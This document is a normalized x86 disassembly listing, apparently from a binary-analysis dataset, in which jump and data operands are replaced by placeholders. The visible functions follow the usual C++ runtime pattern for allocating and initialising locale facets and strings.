lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp + 0x1c ]
mov ebx ecx
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x38 ] eax
movsb [ edi ] [ esi ]
call sub_10003d21
mov al [ ebp + 0x24 ]
and [ ebp - 0x4 ] 0x0
test al al
jne r-xdata
mov [ ebp - 0x16 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x15 ] al
mov al [ ebp + 0x20 ]
mov [ ebp - 0x16 ] al
jmp r-xdata
push 0x0
push esi
lea ecx [ ebp - 0x34 ]
call sub_10007a24
mov eax [ ebp - 0x20 ]
mov edi [ ebx + 0x8 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_10010e6d
mov ecx eax
call sub_100084d4
push edi
push [ ebp - 0x38 ]
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp - 0x48 ]
push eax
call sub_10033675
mov edi eax
add esp 0x14
test edi edi
jbe r-xdata
push 0x10
pop esi
jmp r-xdata
add esi esi
and [ ebp - 0x50 ] 0x0
push 0x1
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x34 ]
dec edi
call sub_10010e6d
mov ecx eax
call sub_1003ffe1
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor esi esi
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] eax
cmp edi esi
jbe r-xdata
mov eax [ ebp + 0xc ]
mov edi [ ebp - 0x40 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push esi
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
call sub_10002020
mov eax edi
call sub_100282ef
retn 0x20
add ebx 0xc
xor eax eax
jle r-xdata
push ebx
lea eax [ ebp - 0x50 ]
push eax
push edi
lea ecx [ ebp - 0x3c ]
call sub_100084d4
push eax
lea eax [ ebp - 0x44 ]
push eax
call sub_1002382a
add esp 0x14
cmp eax 0xfffffffd
je r-xdata
push eax
lea ecx [ ebp - 0x3c ]
sub edi eax
call sub_1003f869
push [ ebp - 0x44 ]
lea ecx [ ebp + 0xc ]
call sub_1003f677
cmp edi esi
ja r-xdata
cmp eax esi
jl r-xdata
jne r-xdata
cmp [ ebp - 0x44 ] si
jne r-xdata
lea ecx [ ebp - 0x3c ]
call sub_100084d4
push eax
call sub_10024630
pop ecx
inc eax
jmp r-xdata
sub_10040c4e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003fc29
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_100406cb
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10040c78
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003fc29
push [ ebp + 0x8 ]
mov ecx esi
call sub_10040741
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10040c9f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003fc29
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_10040762
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10040cc9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_1003fc29
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
mov ecx esi
call sub_10040636
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10040cf4
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003e973
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10040d95
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x2
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x20
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ec2b
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ ebp - 0x4 ] 0x2
mov [ esi ] eax
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10040e36
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ef1b
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10040ed5
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003ef7f
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10040f6f
push 0x24
mov eax sub_1004bf52
call sub_10028203
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x10 ] ecx
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_10003efc
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
sar eax 0x1
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000583e
mov eax esi
call sub_100282db
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_1000583e
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_10008a30
mov ecx eax
call sub_10005274
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_10008a30
mov ecx eax
call sub_10005274
push [ ebp - 0x10 ]
lea ecx [ ebx + edi * 2 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ecx
push eax
call sub_1004b295
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_1004101d
push 0x94
mov eax sub_1004d842
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10024389
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_100410d5
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003efc3
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041174
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003efe6
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041213
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1004027f
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041322
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_100402cb
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_100413c1
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003f043
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041460
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003f147
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_100414ff
push 0x98
mov eax sub_1004c6b7
call sub_10028203
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ ebp - 0x10 ] edi
cmp eax edi
je r-xdata
push 0x4
pop eax
call sub_100282db
retn
cmp [ eax ] edi
jne r-xdata
push 0x18
call sub_10024389
pop ecx
mov [ ebp - 0x14 ] eax
xor ebx ebx
inc ebx
push 0x3
mov [ ebp - 0x4 ] edi
pop esi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x30 ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp - 0x14 ]
push ebx
push edi
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_1003fed1
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa4 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x30 ]
call sub_10002020
sub_100415da
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
xor ebx ebx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
inc ebx
cmp esi edi
je r-xdata
mov eax ebx
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003f281
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041674
push 0x24
mov eax sub_1004bf86
call sub_10028203
mov [ ebp - 0x10 ] ecx
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
and [ ebp - 0x1c ] 0x0
mov ecx esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
call sub_100403af
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax edi
sar eax 0x1
mov [ ebp - 0x1c ] 0x1
je r-xdata
push 0x0
push eax
mov ecx esi
call sub_10040843
mov eax esi
call sub_100282db
retn 0xc
mov ecx [ ebp - 0x10 ]
add ecx 0x8
mov [ ebp - 0x10 ] ecx
test eax eax
ja r-xdata
push 0x0
push eax
mov ecx esi
call sub_10040843
lea eax [ ebp - 0x28 ]
push eax
mov ecx esi
call sub_1003ff81
mov ecx eax
call sub_1003f2c3
mov edi [ esi + 0x14 ]
mov ebx eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx esi
call sub_1003ff81
mov ecx eax
call sub_1003f2c3
push [ ebp - 0x10 ]
lea ecx [ ebx + edi * 2 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
push ecx
push eax
call sub_1003f394
add esp 0x14
cmp eax [ esi + 0x14 ]
jbe r-xdata
sub_10041722
push 0x94
mov eax sub_1004d842
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
cmp edi ebx
je r-xdata
push 0x6
pop eax
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x8
call sub_10024389
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] ebx
inc ebx
test esi esi
je r-xdata
xor esi esi
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x3
mov [ esi ] r--data
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop eax
mov [ ebp - 0x4 ] eax
mov [ edi ] esi
test [ ebp - 0x10 ] al
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_100417da
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003f3e9
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041879
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x3
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x10
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003f47a
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041918
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10040317
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_100419d3
push 0x94
mov eax sub_1004bfe0
call sub_10028203
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x8 ]
push 0x3
pop esi
cmp edi ebx
je r-xdata
mov eax esi
call sub_100282db
retn
cmp [ edi ] ebx
jne r-xdata
push 0x34
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] ebx
inc ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x10 ] ebx
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push ebx
push 0x0
push eax
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x10 ] esi
call sub_10040363
jmp r-xdata
test [ ebp - 0x10 ] bl
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
test [ ebp - 0x10 ] 0x2
mov [ edi ] eax
mov [ ebp - 0x4 ] esi
je r-xdata
push 0x0
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041a72
push 0x94
mov eax sub_1004d842
call sub_10028203
xor edi edi
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x5
pop eax
call sub_100282db
retn
cmp [ esi ] edi
jne r-xdata
push 0x14
call sub_10024389
pop ecx
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10003832
push eax
lea ecx [ ebp - 0xa0 ]
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x1
call sub_100037dd
mov ecx [ ebp + 0x8 ]
push edi
push eax
mov [ ebp - 0x10 ] 0x3
call sub_1003f560
jmp r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0xa0 ]
call sub_1000384f
push 0x2
pop ecx
mov [ ebp - 0x4 ] ecx
mov [ esi ] eax
test [ ebp - 0x10 ] cl
je r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10002020
sub_10041b11
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
mov ecx [ ebp + 0x8 ]
push eax
call sub_1000348e
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_100230e4
mov eax edi
call sub_100282db
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10040d95
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10003a56
push edi
call sub_100232a0
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100244ef
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10027dd1
sub_10041bae
push 0x14
mov eax sub_1004c006
call sub_10028203
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100230bc
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10003459
